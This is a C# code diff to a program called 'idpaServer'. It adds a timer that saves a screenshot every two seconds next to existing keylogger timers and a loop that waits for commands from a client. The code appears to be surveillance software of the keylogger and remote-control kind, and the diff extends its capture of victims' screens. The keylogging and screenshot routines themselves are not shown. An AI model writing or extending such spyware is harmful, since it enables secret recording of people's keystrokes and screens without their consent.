@@ -13,7 +13,8 @@ namespace idpaServer
         //Config
         public const string APP_PATH = @"C:\Temp";
         public const string DATA_PATH = @"C:\Users";
-        public const int PRINT_SCREEN_INTERVAL = 60000; //Interval in which a Screenshot is taken -- Intervall in miliseconds 1000 = 1 sek
+        public const string PRINTSCREEN_PATH = APP_PATH + @"\PrintScreen.jpg";
+        public const int PRINT_SCREEN_INTERVAL = 2000; //Interval in which a Screenshot is taken -- Intervall in miliseconds 1000 = 1 sek default 60000
         public const int KEY_LOG_INTERVAL = 10; //Intervall in which keys will be stored in the Logger Object
         public const int KEY_LOGFILE_INTERVAL = 30000; //Intervall in which the log file will be updated
 
@@ -33,6 +34,7 @@ namespace idpaServer
             //timerPrintScreen.Elapsed += new ElapsedEventHandler(PrintScreen.GetScreenshot);
             timerKey.Elapsed += new ElapsedEventHandler(Keylogger.KeyTick);
             timerKeyLogfile.Elapsed += new ElapsedEventHandler(Keylogger.LogTick);
+            timerPrintScreen.Elapsed += new ElapsedEventHandler(InitSavePrintScreen);
 
             //Enable the Timers
             timerPrintScreen.Enabled = true;
@@ -50,6 +52,11 @@ namespace idpaServer
             {
                 //Wait for Command form the Client
             }
+        }
+
+        private static void InitSavePrintScreen(object sender, EventArgs e)
+        {
+            FileManager.SavePrintScreen(PrintScreen.GetScreenshot(), PRINTSCREEN_PATH);
         }
     }
 }
